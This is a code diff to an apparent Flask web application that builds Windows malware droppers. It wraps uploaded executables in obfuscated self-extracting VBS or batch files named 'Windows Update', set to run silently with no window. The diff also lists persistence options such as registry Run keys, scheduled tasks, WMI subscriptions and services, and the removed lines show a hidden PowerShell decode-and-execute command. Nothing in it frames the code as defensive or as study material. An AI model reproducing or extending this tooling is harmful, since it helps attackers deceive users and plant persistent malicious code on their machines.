@@ -22,6 +22,7 @@ from fingerprint_manager import FingerprintManager
 from payload_installer import create_one_click_payload
 from persistence_manager import create_persistent_payload
 from combined_pipeline import CombinedPipeline, generate_combined_payload
+from vbs_core import generate_self_extracting_vbs, generate_persistent_vbs
 
 logger = logging.getLogger(__name__)
 
@@ -253,7 +254,7 @@ def upload_file():
         return jsonify({'error': 'No file selected'}), 400
 
     # Validate file type
-    allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'}
+    allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs', '.ps1'}
     file_ext = os.path.splitext(file.filename)[1].lower()
 
     if file_ext not in allowed_extensions:
@@ -316,23 +317,17 @@ def generate_payload():
                 proxy_id
             )
 
-        # Convert to base64 for embedding in command
         encoded_file = base64.b64encode(file_content).decode()
-
-        # Generate command that will decode and execute the file
         filename = os.path.basename(uploaded_file)
-        cmd = (
-            f'powershell -NoProfile -Command '
-            f'"$f=\'$env:temp\\\\{filename}\'; '
-            f'[System.IO.File]::WriteAllBytes($f, '
-            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
-            f'& $f"'
+
+        vbs_payload = generate_self_extracting_vbs(
+            base64_data=encoded_file,
+            original_filename=filename,
+            write_dir='temp',
+            cleanup=True,
+            delays=True,
         )
 
-        # Generate VBS payload
-        vbs_payload = payload_gen.generate(cmd, technique, obfuscation)
-
-        # Apply additional obfuscation from options
         if options.get('add_comments'):
             vbs_payload = add_vbs_comments(vbs_payload)
 
@@ -472,17 +467,16 @@ def batch_generate():
 
         encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
-        cmd = (
-            f'powershell -NoProfile -Command '
-            f'"$f=\'$env:temp\\\\{filename}\'; '
-            f'[System.IO.File]::WriteAllBytes($f, '
-            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
-            f'& $f"'
-        )
 
         results = {}
         for technique in techniques:
-            payload = payload_gen.generate(cmd, technique, obfuscation)
+            payload = generate_self_extracting_vbs(
+                base64_data=encoded_file,
+                original_filename=filename,
+                write_dir='temp',
+                cleanup=True,
+                delays=True,
+            )
             output_id = str(uuid.uuid4())[:8]
             output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
             with open(output_path, 'w') as f:
@@ -518,37 +512,30 @@ def generate_one_click():
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
 
-        # Read file and embed content as base64
         with open(uploaded_file, 'rb') as f:
             file_content = f.read()
 
         encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
 
-        # Generate PowerShell command that decodes and executes the embedded file
-        cmd = (
-            f'powershell -NoProfile -WindowStyle Hidden -Command '
-            f'"$f=\'$env:temp\\\\{filename}\'; '
-            f'[System.IO.File]::WriteAllBytes($f, '
-            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
-            f'Start-Process $f -WindowStyle Hidden"'
+        vbs_payload = generate_self_extracting_vbs(
+            base64_data=encoded_file,
+            original_filename=filename,
+            write_dir='temp',
+            cleanup=True,
+            delays=True,
         )
 
-        # Generate one-click payload
-        result = create_one_click_payload(cmd, obfuscation_style)
-
-        # Save payload
         output_id = str(uuid.uuid4())[:8]
 
-        if file_type == 'vbs':
-            payload_content = result['vbs_payload']
-            filename_out = result['filename_vbs']
-        elif file_type == 'bat':
-            payload_content = result['bat_payload']
-            filename_out = result['filename_bat']
+        if file_type == 'bat':
+            from payload_installer import SelfExtractingPayload
+            bat_payload = SelfExtractingPayload.create_obfuscated_batch_wrapper(vbs_payload)
+            payload_content = bat_payload
+            filename_out = 'Windows Update.bat'
         else:
-            payload_content = result['vbs_payload']
-            filename_out = result['filename_vbs']
+            payload_content = vbs_payload
+            filename_out = 'Windows Update.vbs'
 
         output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_{filename_out}")
 
@@ -561,7 +548,7 @@ def generate_one_click():
             'filename': filename_out,
             'payload': payload_content,
             'size': len(payload_content),
-            'instructions': result['instructions'],
+            'instructions': 'Double-click the file to run. Silent execution, no visible window.',
             'style': obfuscation_style,
             'file_type': file_type
         })
@@ -657,11 +644,10 @@ def get_persistence_methods():
     """Get available persistence methods"""
     methods = {
         'registry': 'Registry HKCU/HKLM Run keys - All Windows versions',
-        'startup': 'Startup folder - All Windows versions',
-        'task': 'Windows Scheduled Tasks - Vista+',
+        'startup_folder': 'Startup folder - All Windows versions',
+        'scheduled_task': 'Windows Scheduled Tasks - Vista+',
         'wmi': 'WMI Event Subscriptions - Vista+',
         'service': 'Windows Service - All Windows (admin required)',
-        'defender': 'Windows Defender exclusions - Windows 8+',
         'multi': 'Multiple methods for maximum redundancy - All Windows (RECOMMENDED)'
     }
     return jsonify({'methods': methods})
@@ -686,32 +672,18 @@ def generate_persistent_payload():
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
 
-        # Read file
         with open(uploaded_file, 'rb') as f:
             file_content = f.read()
 
-        # Convert to base64 for embedding in command
         encoded_file = base64.b64encode(file_content).decode()
-
-        # Generate command that will decode and execute the file
         filename = os.path.basename(uploaded_file)
-        cmd = (
-            f'powershell -NoProfile -Command '
-            f'"$f=\'$env:temp\\\\{filename}\'; '
-            f'[System.IO.File]::WriteAllBytes($f, '
-            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
-            f'& $f"'
+
+        vbs_payload, persistence_cmd = generate_persistent_vbs(
+            base64_data=encoded_file,
+            original_filename=filename,
         )
 
-        # Generate persistent payload
-        result = create_persistent_payload(cmd, persistence_method)
-
-        # Generate standard obfuscation on top
-        vbs_payload = result['vbs_code']
-
-        # Wrap in standard obfuscation
-        if technique != 'direct':
-            vbs_payload = payload_gen.encoder.create_polymorphic_wrapper(vbs_payload)
+        result = create_persistent_payload(persistence_cmd, persistence_method)
 
         # Save payload to output
         output_id = str(uuid.uuid4())[:8]
@@ -772,16 +744,17 @@ def generate_combined():
 
         encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
-        cmd = (
-            f'powershell -NoProfile -Command '
-            f'"$f=\'$env:temp\\\\{filename}\'; '
-            f'[System.IO.File]::WriteAllBytes($f, '
-            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
-            f'& $f"'
+
+        base_vbs = generate_self_extracting_vbs(
+            base64_data=encoded_file,
+            original_filename=filename,
+            write_dir='temp',
+            cleanup=True,
+            delays=True,
         )
 
         result = generate_combined_payload(
-            cmd,
+            base_vbs,
             preset=preset,
             encoding=encoding,
             installer=installer,
